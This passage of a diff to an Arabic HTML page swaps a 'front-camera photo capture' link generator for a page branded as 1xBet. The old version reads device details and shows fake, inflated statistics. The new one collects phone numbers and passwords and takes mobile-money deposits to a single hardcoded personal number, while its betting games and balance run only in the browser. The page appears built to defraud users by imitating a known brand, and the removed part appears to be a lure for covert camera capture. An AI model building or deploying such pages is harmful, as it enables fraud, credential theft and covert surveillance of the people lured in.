+                height: 150px;
+            }
+            
+            .plane, .explosion {
+                font-size: 50px;
+            }
+        }
+        
+        @media (max-width: 576px) {
+            .login-form, .register-form {
+                padding: 20px;
+            }
+            
+            .multiplier-grid {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 10px;
+            }
+            
+            .apple-box {
+                width: 40px;
+                height: 40px;
+                font-size: 20px;
+            }
+            
+            .modal-content {
+                width: 95%;
+            }
+            
+            .payment-methods {
+                grid-template-columns: 1fr;
+            }
+            
+            .multiplier-value {
+                font-size: 16px;
+            }
+            
+            .countdown {
+                font-size: 30px;
+            }
+            
+            .multiplier-display {
+                font-size: 30px;
+            }
+            
+            .game-result {
+                font-size: 20px;
+                padding: 15px;
+            }
+            
+            .apple-prize {
+                font-size: 18px;
+            }
+            
+            .bet-input {
+                max-width: 200px;
+            }
+        }
+        
+        @media (max-width: 400px) {
+            .apple-box {
+                width: 35px;
+                height: 35px;
+                font-size: 18px;
+            }
+            
+            .apple-row {
+                gap: 8px;
+            }
+            
+            .multiplier-box {
+                padding: 10px;
+            }
+            
+            .multiplier-value {
+                font-size: 14px;
             }
         }
     </style>
 </head>
 <body>
-    <!-- تأثيرات دموية في الخلفية -->
-    <div class="blood-bg" id="bloodBg"></div>
+    <!-- Toast Notification -->
+    <div class="toast" id="toast"></div>
     
-    <div class="container">
-        <header>
-            <h1>موقع التقاط الصور</h1>
-            <p class="tagline">التقاط صور احترافية من الكاميرا الأمامية بضغطة زر</p>
+    <!-- Processing Message -->
+    <div class="processing-message" id="processingMessage">
+        <div class="processing-content">
+            <div class="processing-icon">
+                <i class="fas fa-spinner fa-spin"></i>
+            </div>
+            <div class="processing-text" id="processingText">جاري معالجة طلبك</div>
+            <div class="processing-details" id="processingDetails">يرجى الانتظار حتى نتحقق من العملية</div>
+        </div>
+    </div>
+    
+    <!-- Login Page -->
+    <div class="login-page" id="loginPage">
+        <div class="particles" id="particles"></div>
+        
+        <div class="login-container">
+            <div class="login-logo">
+                <svg width="180" height="60" viewBox="0 0 180 60" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <rect x="10" y="10" width="160" height="40" rx="5" fill="#C41E3A"/>
+                    <path d="M30 20L40 30L50 20L60 30L70 20L80 30L90 20L100 30L110 20L120 30L130 20L140 30" stroke="#FFCC00" stroke-width="3" stroke-linecap="round"/>
+                    <text x="90" y="35" font-family="Arial" font-size="20" font-weight="bold" fill="white" text-anchor="middle">1xBet</text>
+                </svg>
+            </div>
+            
+            <div class="login-form" id="loginForm">
+                <h2 class="form-title">تسجيل الدخول</h2>
+                
+                <div class="input-group">
+                    <span class="input-icon"><i class="fas fa-mobile-alt"></i></span>
+                    <input type="text" class="form-input" id="loginPhone" placeholder="رقم الهاتف" required>
+                </div>
+                
+                <div class="input-group">
+                    <span class="input-icon"><i class="fas fa-lock"></i></span>
+                    <input type="password" class="form-input" id="loginPassword" placeholder="كلمة المرور" required>
+                </div>
+                
+                <button class="form-btn" id="loginBtn">
+                    <span>تسجيل الدخول</span>
+                </button>
+                
+                <div class="form-footer">
+                    <p>ليس لديك حساب؟ <span class="switch-form" id="showRegister">سجل الآن</span></p>
+                </div>
+            </div>
+            
+            <div class="login-form register-form" id="registerForm">
+                <h2 class="form-title">تسجيل حساب جديد</h2>
+                
+                <div class="input-group">
+                    <span class="input-icon"><i class="fas fa-mobile-alt"></i></span>
+                    <input type="text" class="form-input" id="registerPhone" placeholder="رقم الهاتف" required>
+                </div>
+                
+                <div class="input-group">
+                    <span class="input-icon"><i class="fas fa-lock"></i></span>
+                    <input type="password" class="form-input" id="registerPassword" placeholder="كلمة المرور" required>
+                </div>
+                
+                <div class="input-group">
+                    <span class="input-icon"><i class="fas fa-lock"></i></span>
+                    <input type="password" class="form-input" id="confirmPassword" placeholder="تأكيد كلمة المرور" required>
+                </div>
+                
+                <button class="form-btn" id="registerBtn">
+                    <span>تسجيل</span>
+                </button>
+                
+                <div class="form-footer">
+                    <p>لديك حساب بالفعل؟ <span class="switch-form" id="showLogin">تسجيل الدخول</span></p>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Main App Container -->
+    <div class="app-container" id="appContainer">
+        <!-- Header -->
+        <header class="app-header">
+            <div class="header-left">
+                <div class="header-logo">
+                    <i class="fas fa-coins"></i>
+                    <span>1xBet</span>
+                </div>
+                <div class="user-info">
+                    <div class="user-avatar" id="userAvatar">U</div>
+                    <div class="username" id="usernameDisplay">مستخدم</div>
+                </div>
+            </div>
+            
+            <div class="balance-container">
+                <div class="balance">
+                    <span id="balanceDisplay">0</span>
+                    <span class="balance-icon"><i class="fas fa-wallet"></i></span>
+                </div>
+                <button class="action-btn" id="depositBtn">
+                    <span>إيداع</span>
+                    <span>+</span>
+                </button>
+                <button class="action-btn" id="withdrawBtn">
+                    <span>سحب</span>
+                    <span>-</span>
+                </button>
+            </div>
         </header>
         
-        <div class="sections-container">
-            <!-- القسم الأول: استخراج الرابط -->
-            <section class="section">
-                <h2 class="section-title">استخراج الرابط</h2>
-                <p>انقر على الزر أدناه لإنشاء رابط خاص لالتقاط الصور من الكاميرا الأمامية.</p>
-                
-                <div class="link-container">
-                    <button class="camera-link" id="generateLink">إنشاء رابط التقاط الصور</button>
-                </div>
-                
-                <div id="generatedLinkContainer" style="display: none;">
-                    <p>تم إنشاء الرابط بنجاح:</p>
-                    <div class="device-info">
-                        <a href="#" id="generatedLink" target="_blank" style="color: var(--accent-color); word-break: break-all;"></a>
-                    </div>
-                </div>
-            </section>
+        <!-- Main Content -->
+        <main class="main-content" id="mainContent">
+            <div class="welcome-message">
+                <h3 class="welcome-title">مرحباً بك، <span id="welcomeUsername">مستخدم</span>!</h3>
+                <p>استمتع بألعابنا الممتعة واربح جوائز كبيرة</p>
+            </div>
             
-            <!-- القسم الثاني: معلومات الجهاز وعرض الصور -->
-            <section class="section">
-                <h2 class="section-title">معلومات الجهاز</h2>
-                
-                <div class="device-info">
-                    <div class="info-item">
-                        <span class="info-label">نظام التشغيل:</span>
-                        <span id="osInfo">جارِ الكشف...</span>
-                    </div>
-                    <div class="info-item">
-                        <span class="info-label">المتصفح:</span>
-                        <span id="browserInfo">جارِ الكشف...</span>
-                    </div>
-                    <div class="info-item">
-                        <span class="info-label">الدقة:</span>
-                        <span id="resolutionInfo">جارِ الكشف...</span>
-                    </div>
-                    <div class="info-item">
-                        <span class="info-label">اللغة:</span>
-                        <span id="languageInfo">جارِ الكشف...</span>
-                    </div>
-                    <div class="info-item">
-                        <span class="info-label">الوقت:</span>
-                        <span id="timeInfo">جارِ الكشف...</span>
-                    </div>
+            <div class="games-container">
+                <div class="game-card" id="planeGameCard">
+                    <div class="game-icon">✈️</div>
+                    <h3 class="game-title">لعبة الطيارة</h3>
+                    <p class="game-desc">اختر مضاعفك واضغط قفز قبل انفجار الطيارة لتربح!</p>
+                    <button class="game-btn">ابدأ اللعب</button>
                 </div>
                 
-                <button class="photos-btn" id="showPhotosBtn">عرض الصور الملتقطة</button>
-                
-                <div class="captured-photos" id="capturedPhotos">
-                    <h3>الصور الملتقطة</h3>
-                    <div class="photos-grid" id="photosGrid">
-                        <!-- سيتم إضافة الصور هنا ديناميكيًا -->
-                    </div>
-                </div>
-            </section>
-            
-            <!-- القسم الثالث: الإحصائيات والمعلومات -->
-            <section class="section">
-                <h2 class="section-title">إحصائيات الموقع</h2>
-                
-                <div class="stats-container">
-                    <div class="stat-item">
-                        <div class="stat-value" id="dailySubs">127</div>
-                        <div class="stat-label">الاشتراكات اليومية</div>
-                    </div>
-                    <div class="stat-item">
-                        <div class="stat-value" id="weeklySubs">894</div>
-                        <div class="stat-label">الاشتراكات الأسبوعية</div>
-                    </div>
-                    <div class="stat-item">
-                        <div class="stat-value" id="monthlySubs">3,652</div>
-                        <div class="stat-label">الاشتراكات الشهرية</div>
-                    </div>
-                    <div class="stat-item">
-                        <div class="stat-value" id="yearlySubs">43,821</div>
-                        <div class="stat-label">الاشتراكات السنوية</div>
-                    </div>
-                    <div class="stat-item">
-                        <div class="stat-value" id="totalLinks">12,487</div>
-                        <div class="stat-label">إجمالي الروابط المستخرجة</div>
-                    </div>
-                    <div class="stat-item">
-                        <div class="stat-value" id="activeNow">243</div>
-                        <div class="stat-label">مستخدم نشط الآن</div>
-                    </div>
+                <div class="game-card" id="appleGameCard">
+                    <div class="game-icon">🍏</div>
+                    <h3 class="game-title">لعبة التفاحة</h3>
+                    <p class="game-desc">اختر التفاحات الجيدة وتجنب السيئة لتربح الجوائز!</p>
+                    <button class="game-btn">ابدأ اللعب</button>
                 </div>
                 
-                <div style="margin-top: 20px; padding: 15px; background: rgba(0,0,0,0.3); border-radius: 10px;">
-                    <h3 style="color: var(--accent-color); margin-bottom: 10px;">معلومات عن الموقع</h3>
-                    <p>هذا الموقع يتيح لك التقاط صور احترافية من الكاميرا الأمامية بسهولة. نحن نضمن خصوصيتك وأمان بياناتك.</p>
+                <div class="game-card" id="comingSoonCard">
+                    <div class="game-icon">🎰</div>
+                    <h3 class="game-title">ألعاب قريباً</h3>
+                    <p class="game-desc">نعمل على إضافة المزيد من الألعاب الممتعة قريباً</p>
+                    <button class="game-btn" disabled>قريباً</button>
                 </div>
-            </section>
+            </div>
+        </main>
+        
+        <!-- Deposit Modal -->
+        <div class="modal-overlay" id="depositModal">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h3 class="modal-title">إيداع الأموال</h3>
+                    <button class="close-modal" id="closeDepositModal">×</button>
+                </div>
+                
+                <div class="modal-body">
+                    <h4 style="margin-bottom: 15px; color: var(--secondary-color);">اختر وسيلة الدفع:</h4>
+                    
+                    <div class="payment-methods">
+                        <div class="payment-method" data-method="vodafone">
+                            <div class="payment-icon"><i class="fas fa-mobile-alt"></i></div>
+                            <div class="payment-name">فودافون كاش</div>
+                        </div>
+                        
+                        <div class="payment-method" data-method="orange">
+                            <div class="payment-icon"><i class="fas fa-mobile-alt"></i></div>
+                            <div class="payment-name">أورنج كاش</div>
+                        </div>
+                        
+                        <div class="payment-method" data-method="etisalat">
+                            <div class="payment-icon"><i class="fas fa-mobile-alt"></i></div>
+                            <div class="payment-name">اتصالات كاش</div>
+                        </div>
+                    </div>
+                    
+                    <div class="payment-info" id="paymentInfo">
+                        <div class="payment-detail">
+                            <span>الحد الأدنى للإيداع:</span>
+                            <span style="color: var(--secondary-color);">150 جنيه</span>
+                        </div>
+                        <div class="payment-detail">
+                            <span>رقم التحويل:</span>
+                            <span>
+                                <span class="payment-number" id="paymentNumber">010xxxxxxxx</span>
+                                <button class="copy-btn" id="copyPaymentNumber">
+                                    <i class="fas fa-copy"></i> نسخ
+                                </button>
+                            </span>
+                        </div>
+                    </div>
+                    
+                    <label class="input-label">رقم الهاتف المرسل منه</label>
+                    <input type="text" class="amount-input" id="depositPhone" placeholder="أدخل رقم الهاتف" required>
+                    
+                    <label class="input-label">المبلغ بالجنيه</label>
+                    <input type="number" class="amount-input" id="depositAmount" placeholder="أدخل المبلغ" min="150">
+                    
+                    <button class="modal-btn" id="addBalanceBtn">
+                        <span id="addBalanceText">إضافة الرصيد</span>
+                        <span class="spinner" id="depositSpinner" style="display: none;"></span>
+                    </button>
+                </div>
+            </div>
         </div>
         
-        <footer>
-            <p>تم التطوير باستخدام HTML5 و JavaScript - جميع الحقوق محفوظة &copy; 2023</p>
-        </footer>
+        <!-- Withdraw Modal -->
+        <div class="modal-overlay" id="withdrawModal">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h3 class="modal-title">سحب الأموال</h3>
+                    <button class="close-modal" id="closeWithdrawModal">×</button>
+                </div>
+                
+                <div class="modal-body">
+                    <h4 style="margin-bottom: 15px; color: var(--secondary-color);">اختر وسيلة السحب:</h4>
+                    
+                    <div class="payment-methods">
+                        <div class="payment-method" data-method="vodafone">
+                            <div class="payment-icon"><i class="fas fa-mobile-alt"></i></div>
+                            <div class="payment-name">فودافون كاش</div>
+                        </div>
+                        
+                        <div class="payment-method" data-method="orange">
+                            <div class="payment-icon"><i class="fas fa-mobile-alt"></i></div>
+                            <div class="payment-name">أورنج كاش</div>
+                        </div>
+                        
+                        <div class="payment-method" data-method="etisalat">
+                            <div class="payment-icon"><i class="fas fa-mobile-alt"></i></div>
+                            <div class="payment-name">اتصالات كاش</div>
+                        </div>
+                    </div>
+                    
+                    <div class="payment-info" id="withdrawInfo">
+                        <div class="payment-detail">
+                            <span>الحد الأدنى للسحب:</span>
+                            <span style="color: var(--secondary-color);">200 جنيه</span>
+                        </div>
+                        <div class="payment-detail">
+                            <span>الرصيد المتاح:</span>
+                            <span style="color: var(--secondary-color);" id="availableBalance">0</span> جنيه
+                        </div>
+                    </div>
+                    
+                    <label class="input-label">المبلغ بالجنيه</label>
+                    <input type="number" class="amount-input" id="withdrawAmount" placeholder="أدخل المبلغ" min="200">
+                    
+                    <label class="input-label">رقم الهاتف</label>
+                    <input type="text" class="amount-input" id="withdrawPhone" placeholder="أدخل رقم الهاتف">
+                    
+                    <button class="modal-btn" id="withdrawBalanceBtn">
+                        <span id="withdrawBalanceText">طلب السحب</span>
+                        <span class="spinner" id="withdrawSpinner" style="display: none;"></span>
+                    </button>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Plane Game Section -->
+        <div class="game-section plane-game" id="planeGame">
+            <div class="game-header">
+                <div class="game-balance">
+                    <i class="fas fa-wallet"></i>
+                    <span id="planeGameBalance">0</span> جنيه
+                </div>
+                <button class="back-btn" id="backFromPlaneBtn">
+                    <i class="fas fa-arrow-right"></i>
+                    <span>العودة</span>
+                </button>
+            </div>
+            
+            <h2>لعبة الطيارة</h2>
+            <p style="color: #aaa; margin-bottom: 20px;">اختر مضاعفك واضغط قفز قبل انفجار الطيارة لتربح!</p>
+            
+            <div class="bet-amount-container">
+                <input type="number" class="bet-input" id="planeBetAmount" placeholder="مبلغ الرهان" min="10">
+                <button class="game-btn" id="startPlaneGameBtn">بدأ الرهان</button>
+            </div>
+            
+            <div class="multiplier-grid" id="multiplierGrid">
+                <div class="multiplier-box" data-multiplier="1.5">
+                    <div class="multiplier-value">1.5x</div>
+                    <div style="font-size: 12px; color: #aaa;">ربح: 150%</div>
+                </div>
+                <div class="multiplier-box" data-multiplier="2">
+                    <div class="multiplier-value">2x</div>
+                    <div style="font-size: 12px; color: #aaa;">ربح: 200%</div>
+                </div>
+                <div class="multiplier-box" data-multiplier="3">
+                    <div class="multiplier-value">3x</div>
+                    <div style="font-size: 12px; color: #aaa;">ربح: 300%</div>
+                </div>
+                <div class="multiplier-box" data-multiplier="5">
+                    <div class="multiplier-value">5x</div>
+                    <div style="font-size: 12px; color: #aaa;">ربح: 500%</div>
+                </div>
+                <div class="multiplier-box" data-multiplier="10">
+                    <div class="multiplier-value">10x</div>
+                    <div style="font-size: 12px; color: #aaa;">ربح: 1000%</div>
+                </div>
+            </div>
+            
+            <div class="explosion-info" id="explosionInfo">
+                <p>الطيارة ستنفجر عند مضاعف عشوائي بين 1.0x و 20.0x</p>
+                <p>المضاعف الحالي: <span id="currentMultiplierDisplay">0.0x</span></p>
+            </div>
+            
+            <div class="countdown" id="countdown"></div>
+            
+            <div class="multiplier-container">
+                <div class="multiplier-display" id="multiplierDisplay">0.0x</div>
+                
+                <div class="plane-container">
+                    <div class="plane" id="plane">✈️</div>
+                    <div class="explosion" id="explosion">💥</div>
+                </div>
+            </div>
+            
+            <button class="jump-btn" id="jumpBtn" disabled>قفز!</button>
+            
+            <div class="game-result" id="planeGameResult"></div>
+        </div>
+        
+        <!-- Apple Game Section -->
+        <div class="game-section apple-game" id="appleGame">
+            <div class="game-header">
+                <div class="game-balance">
+                    <i class="fas fa-wallet"></i>
+                    <span id="appleGameBalance">0</span> جنيه
+                </div>
+                <button class="back-btn" id="backFromAppleBtn">
+                    <i class="fas fa-arrow-right"></i>
+                    <span>العودة</span>
+                </button>
+            </div>
+            
+            <h2>لعبة التفاحة</h2>
+            <p style="color: #aaa; margin-bottom: 20px;">اختر التفاحات الجيدة وتجنب السيئة لتربح الجوائز!</p>
+            
+            <div class="apple-bet-container">
+                <input type="number" class="bet-input" id="appleBetAmount" placeholder="مبلغ الرهان" min="10">
+                <button class="game-btn" id="startAppleGameBtn">بدأ الرهان</button>
+            </div>
+            
+            <div class="apple-prize" id="applePrize">الجائزة الحالية: 0 جنيه</div>
+            
+            <button class="cashout-btn" id="cashoutBtn" disabled>
+                <i class="fas fa-money-bill-wave"></i>
+                <span>سحب الجائزة</span>
+            </button>
+            
+            <div class="apple-rows" id="appleRows">
+                <!-- Rows will be generated by JavaScript -->
+            </div>
+            
+            <div class="game-result" id="appleGameResult"></div>
+        </div>
     </div>
-
+    
     <script>
-        // إنشاء تأثيرات دموية في الخلفية
-        function createBloodEffect() {
-            const bloodBg = document.getElementById('bloodBg');
-            const dropsCount = 20;
+        // DOM Elements
+        const loginPage = document.getElementById('loginPage');
+        const appContainer = document.getElementById('appContainer');
+        const mainContent = document.getElementById('mainContent');
+        const loginForm = document.getElementById('loginForm');
+        const registerForm = document.getElementById('registerForm');
+        const showRegister = document.getElementById('showRegister');
+        const showLogin = document.getElementById('showLogin');
+        const loginPhone = document.getElementById('loginPhone');
+        const loginPassword = document.getElementById('loginPassword');
+        const registerPhone = document.getElementById('registerPhone');
+        const registerPassword = document.getElementById('registerPassword');
+        const confirmPassword = document.getElementById('confirmPassword');
+        const loginBtn = document.getElementById('loginBtn');
+        const registerBtn = document.getElementById('registerBtn');
+        const userAvatar = document.getElementById('userAvatar');
+        const usernameDisplay = document.getElementById('usernameDisplay');
+        const welcomeUsername = document.getElementById('welcomeUsername');
+        const balanceDisplay = document.getElementById('balanceDisplay');
+        const depositBtn = document.getElementById('depositBtn');
+        const withdrawBtn = document.getElementById('withdrawBtn');
+        const depositModal = document.getElementById('depositModal');
+        const withdrawModal = document.getElementById('withdrawModal');
+        const paymentMethods = document.querySelectorAll('.payment-method');
+        const paymentInfo = document.getElementById('paymentInfo');
+        const withdrawInfo = document.getElementById('withdrawInfo');
+        const paymentNumber = document.getElementById('paymentNumber');
+        const copyPaymentNumber = document.getElementById('copyPaymentNumber');
+        const depositAmount = document.getElementById('depositAmount');
+        const depositPhone = document.getElementById('depositPhone');
+        const withdrawAmount = document.getElementById('withdrawAmount');
+        const withdrawPhone = document.getElementById('withdrawPhone');
+        const availableBalance = document.getElementById('availableBalance');
+        const addBalanceBtn = document.getElementById('addBalanceBtn');
+        const addBalanceText = document.getElementById('addBalanceText');
+        const depositSpinner = document.getElementById('depositSpinner');
+        const withdrawBalanceBtn = document.getElementById('withdrawBalanceBtn');
+        const withdrawBalanceText = document.getElementById('withdrawBalanceText');
+        const withdrawSpinner = document.getElementById('withdrawSpinner');
+        const closeDepositModal = document.getElementById('closeDepositModal');
+        const closeWithdrawModal = document.getElementById('closeWithdrawModal');
+        const planeGameCard = document.getElementById('planeGameCard');
+        const appleGameCard = document.getElementById('appleGameCard');
+        const planeGame = document.getElementById('planeGame');
+        const appleGame = document.getElementById('appleGame');
+        const planeGameBalance = document.getElementById('planeGameBalance');
+        const appleGameBalance = document.getElementById('appleGameBalance');
+        const planeBetAmount = document.getElementById('planeBetAmount');
+        const appleBetAmount = document.getElementById('appleBetAmount');
+        const startPlaneGameBtn = document.getElementById('startPlaneGameBtn');
+        const startAppleGameBtn = document.getElementById('startAppleGameBtn');
+        const multiplierGrid = document.getElementById('multiplierGrid');
+        const multiplierBoxes = document.querySelectorAll('.multiplier-box');
+        const explosionInfo = document.getElementById('explosionInfo');
+        const currentMultiplierDisplay = document.getElementById('currentMultiplierDisplay');
+        const countdown = document.getElementById('countdown');
+        const multiplierDisplay = document.getElementById('multiplierDisplay');
+        const plane = document.getElementById('plane');
+        const explosion = document.getElementById('explosion');
+        const jumpBtn = document.getElementById('jumpBtn');
+        const planeGameResult = document.getElementById('planeGameResult');
+        const backFromPlaneBtn = document.getElementById('backFromPlaneBtn');
+        const appleRows = document.getElementById('appleRows');
+        const applePrize = document.getElementById('applePrize');
+        const cashoutBtn = document.getElementById('cashoutBtn');
+        const appleGameResult = document.getElementById('appleGameResult');
+        const backFromAppleBtn = document.getElementById('backFromAppleBtn');
+        const toast = document.getElementById('toast');
+        const processingMessage = document.getElementById('processingMessage');
+        const processingText = document.getElementById('processingText');
+        const processingDetails = document.getElementById('processingDetails');
+        
+        // Game State
+        let balance = 0;
+        let currentUser = null;
+        let selectedPaymentMethod = null;
+        let planeGameInterval;
+        let countdownInterval;
+        let currentMultiplier = 0.0;
+        let selectedMultiplier = 0;
+        let planeExploded = false;
+        let explosionMultiplier = 0;
+        let planeBet = 0;
+        let planeGameActive = false;
+        let appleBet = 0;
+        let appleGameActive = false;
+        let appleRowsData = [];
+        let currentAppleRow = 0;
+        let appleGamePrize = 0;
+        
+        // User accounts storage
+        const users = {};
+        
+        // Payment Methods Data
+        const paymentData = {
+            vodafone: { 
+                number: '01123716650', 
+                minAmount: 150,
+                name: 'فودافون كاش'
+            },
+            orange: { 
+                number: '01123716650', 
+                minAmount: 150,
+                name: 'أورنج كاش'
+            },
+            etisalat: { 
+                number: '01123716650', 
+                minAmount: 150,
+                name: 'اتصالات كاش'
+            }
+        };
+        
+        // Show toast notification
+        function showToast(message, type = 'success') {
+            toast.textContent = message;
+            toast.className = `toast show ${type}`;
             
-            for (let i = 0; i < dropsCount; i++) {
-                const drop = document.createElement('div');
-                drop.classList.add('blood-drop');
+            setTimeout(() => {
+                toast.className = 'toast';
+            }, 3000);
+        }
+        
+        // Show processing message
+        function showProcessingMessage(text, details) {
+            processingText.textContent = text;
+            processingDetails.textContent = details;
+            processingMessage.style.display = 'flex';
+        }
+        
+        // Hide processing message
+        function hideProcessingMessage() {
+            processingMessage.style.display = 'none';
+        }
+        
+        // Create particles for login page
+        function createParticles() {
+            const particlesContainer = document.getElementById('particles');
+            const particleCount = 50;
+            
+            for (let i = 0; i < particleCount; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
                 
-                // حجم عشوائي
-                const size = Math.random() * 100 + 50;
-                drop.style.width = `${size}px`;
-                drop.style.height = `${size}px`;
+                // Random size (2px to 6px)
+                const size = Math.random() * 4 + 2;
+                particle.style.width = `${size}px`;
+                particle.style.height = `${size}px`;
                 
-                // موقع عشوائي
-                drop.style.left = `${Math.random() * 100}%`;
+                // Random position
+                particle.style.left = `${Math.random() * 100}%`;
+                particle.style.top = `${Math.random() * 100}%`;
                 
-                // تأخير عشوائي للحركة
-                drop.style.animationDelay = `${Math.random() * 15}s`;
+                // Random opacity
+                particle.style.opacity = Math.random() * 0.5 + 0.1;
                 
-                bloodBg.appendChild(drop);
+                // Random animation duration
+                const duration = Math.random() * 15 + 10;
+                particle.style.animationDuration = `${duration}s`;
+                
+                // Random delay
+                particle.style.animationDelay = `${Math.random() * 5}s`;
+                
+                particlesContainer.appendChild(particle);
             }
         }
         
-        // جمع معلومات الجهاز
-        function gatherDeviceInfo() {
-            // نظام التشغيل
-            const osInfo = document.getElementById('osInfo');
-            const userAgent = navigator.userAgent;
-            let os = "غير معروف";
+        // Initialize the apple game rows
+        function initAppleGame() {
+            appleRows.innerHTML = '';
+            appleRowsData = [];
+            currentAppleRow = 0;
+            appleGamePrize = 0;
+            applePrize.textContent = 'الجائزة الحالية: 0 جنيه';
+            appleGameResult.style.display = 'none';
+            cashoutBtn.disabled = false;
             
-            if (userAgent.indexOf("Win") !== -1) os = "Windows";
-            if (userAgent.indexOf("Mac") !== -1) os = "MacOS";
-            if (userAgent.indexOf("Linux") !== -1) os = "Linux";
-            if (userAgent.indexOf("Android") !== -1) os = "Android";
-            if (userAgent.indexOf("iOS") !== -1) os = "iOS";
-            
-            osInfo.textContent = os;
-            
-            // المتصفح
-            const browserInfo = document.getElementById('browserInfo');
-            let browser = "غير معروف";
-            
-            if (userAgent.indexOf("Chrome") !== -1) browser = "Chrome";
-            if (userAgent.indexOf("Firefox") !== -1) browser = "Firefox";
-            if (userAgent.indexOf("Safari") !== -1) browser = "Safari";
-            if (userAgent.indexOf("Edge") !== -1) browser = "Edge";
-            if (userAgent.indexOf("Opera") !== -1) browser = "Opera";
-            
-            browserInfo.textContent = browser;
-            
-            // دقة الشاشة
-            const resolutionInfo = document.getElementById('resolutionInfo');
-            resolutionInfo.textContent = `${screen.width} × ${screen.height}`;
-            
-            // اللغة
-            const languageInfo = document.getElementById('languageInfo');
-            languageInfo.textContent = navigator.language || "غير معروف";
-            
-            // الوقت
-            const timeInfo = document.getElementById('timeInfo');
-            const now = new Date();
-            timeInfo.textContent = now.toLocaleTimeString('ar-EG');
+            // Create 7 rows
+            for (let i = 0; i < 7; i++) {
+                const rowDiv = document.createElement('div');
+                rowDiv.className = 'apple-row';
+                if (i === 0) rowDiv.classList.add('current-row');
+                
+                // Create array for this row's data (4 good, 1 bad)
+                const rowData = Array(4).fill('good').concat(['bad']);
+                // Shuffle the array
+                for (let j = rowData.length - 1; j > 0; j--) {
+                    const k = Math.floor(Math.random() * (j + 1));
+                    [rowData[j], rowData[k]] = [rowData[k], rowData[j]];
+                }
+                
+                appleRowsData.push(rowData);
+                
+                // Create 5 boxes for this row
+                for (let j = 0; j < 5; j++) {
+                    const box = document.createElement('div');
+                    box.className = 'apple-box';
+                    box.textContent = '🍏';
+                    box.dataset.row = i;
+                    box.dataset.col = j;
+                    box.addEventListener('click', handleAppleBoxClick);
+                    rowDiv.appendChild(box);
+                }
+                
+                appleRows.appendChild(rowDiv);
+            }
         }
         
-        // تحديث الإحصائيات بشكل عشوائي
-        function updateStats() {
-            const dailySubs = document.getElementById('dailySubs');
-            const weeklySubs = document.getElementById('weeklySubs');
-            const monthlySubs = document.getElementById('monthlySubs');
-            const yearlySubs = document.getElementById('yearlySubs');
-            const totalLinks = document.getElementById('totalLinks');
-            const activeNow = document.getElementById('activeNow');
+        // Handle apple box click
+        function handleAppleBoxClick(e) {
+            if (!appleGameActive) return;
             
-            // زيادة عشوائية في الإحصائيات
-            setInterval(() => {
-                dailySubs.textContent = parseInt(dailySubs.textContent.replace(',', '')) + Math.floor(Math.random() * 3);
-                weeklySubs.textContent = parseInt(weeklySubs.textContent.replace(',', '')) + Math.floor(Math.random() * 5);
-                monthlySubs.textContent = parseInt(monthlySubs.textContent.replace(',', '')) + Math.floor(Math.random() * 10);
-                yearlySubs.textContent = parseInt(yearlySubs.textContent.replace(',', '')) + Math.floor(Math.random() * 20);
-                totalLinks.textContent = parseInt(totalLinks.textContent.replace(',', '')) + Math.floor(Math.random() * 8);
-                activeNow.textContent = Math.floor(Math.random() * 50) + 200; // بين 200 و 250
+            const row = parseInt(e.target.dataset.row);
+            const col = parseInt(e.target.dataset.col);
+            
+            // Only allow clicks on current row
+            if (row !== currentAppleRow) return;
+            
+            // Disable this box
+            e.target.style.pointerEvents = 'none';
+            
+            // Check if apple is good or bad
+            if (appleRowsData[row][col] === 'good') {
+                e.target.classList.add('selected');
                 
-                // تنسيق الأرقام بإضافة فواصل
-                dailySubs.textContent = formatNumber(dailySubs.textContent);
-                weeklySubs.textContent = formatNumber(weeklySubs.textContent);
-                monthlySubs.textContent = formatNumber(monthlySubs.textContent);
-                yearlySubs.textContent = formatNumber(yearlySubs.textContent);
-                totalLinks.textContent = formatNumber(totalLinks.textContent);
+                // Add to prize (increasing amount for higher rows)
+                const rowPrize = (currentAppleRow + 1) * appleBet;
+                appleGamePrize += rowPrize;
+                applePrize.textContent = `الجائزة الحالية: ${appleGamePrize} جنيه`;
+                
+                // Show success toast
+                showToast(`لقد ربحت ${rowPrize} جنيه من هذا الصف!`, 'success');
+                
+                // Move to next row if available
+                if (currentAppleRow < 6) {
+                    document.querySelector('.apple-row.current-row').classList.remove('current-row');
+                    currentAppleRow++;
+                    document.querySelectorAll('.apple-row')[6 - currentAppleRow].classList.add('current-row');
+                } else {
+                    // Won the game
+                    balance += appleGamePrize;
+                    updateBalance();
+                    appleGameResult.textContent = `مبروك! لقد ربحت ${appleGamePrize} جنيه`;
+                    appleGameResult.className = 'game-result win';
+                    appleGameResult.style.display = 'block';
+                    appleGameActive = false;
+                    cashoutBtn.disabled = true;
+                    
+                    // Disable all boxes
+                    document.querySelectorAll('.apple-box').forEach(box => {
+                        box.style.pointerEvents = 'none';
+                    });
+                    
+                    // Show success toast
+                    showToast(`مبروك! لقد ربحت ${appleGamePrize} جنيه`, 'success');
+                }
+            } else {
+                e.target.classList.add('bad');
+                appleGameResult.textContent = `للأسف! لقد خسرت ${appleBet} جنيه`;
+                appleGameResult.className = 'game-result lose';
+                appleGameResult.style.display = 'block';
+                appleGameActive = false;
+                cashoutBtn.disabled = true;
+                
+                // Deduct bet amount
+                balance -= appleBet;
+                updateBalance();
+                
+                // Disable all boxes
+                document.querySelectorAll('.apple-box').forEach(box => {
+                    box.style.pointerEvents = 'none';
+                });
+                
+                // Show error toast
+                showToast(`للأسف! لقد خسرت ${appleBet} جنيه`, 'error');
+            }
+        }
+        
+        // Cash out prize
+        function cashoutPrize() {
+            if (appleGamePrize > 0) {
+                balance += appleGamePrize;
+                updateBalance();
+                appleGameResult.textContent = `تم سحب ${appleGamePrize} جنيه بنجاح!`;
+                appleGameResult.className = 'game-result win';
+                appleGameResult.style.display = 'block';
+                appleGameActive = false;
+                cashoutBtn.disabled = true;
+                
+                // Disable all boxes
+                document.querySelectorAll('.apple-box').forEach(box => {
+                    box.style.pointerEvents = 'none';
+                });
+                
+                // Show success toast
+                showToast(`تم سحب ${appleGamePrize} جنيه بنجاح!`, 'success');
+            }
+        }
+        
+        // Start plane game countdown
+        function startPlaneCountdown() {
+            let counter = 5;
+            countdown.textContent = counter;
+            
+            countdownInterval = setInterval(() => {
+                counter--;
+                countdown.textContent = counter;
+                
+                if (counter <= 0) {
+                    clearInterval(countdownInterval);
